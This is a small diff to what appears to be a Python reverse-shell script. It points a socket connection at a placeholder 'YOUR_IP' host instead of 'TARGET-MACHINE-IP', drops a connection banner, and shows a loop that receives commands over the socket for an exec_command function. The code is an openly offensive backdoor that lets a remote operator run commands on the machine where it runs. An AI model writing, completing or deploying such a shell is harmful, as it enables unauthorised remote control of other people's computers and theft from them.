@@ -6,8 +6,7 @@ def exec_command(command):
 
 
 con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-con.connect(("TARGET-MACHINE-IP", PORT))
-con.send("[+] Connection established".encode())
+con.connect(("YOUR_IP", PORT))
 
 while True:
     command = con.recv(1024).decode()
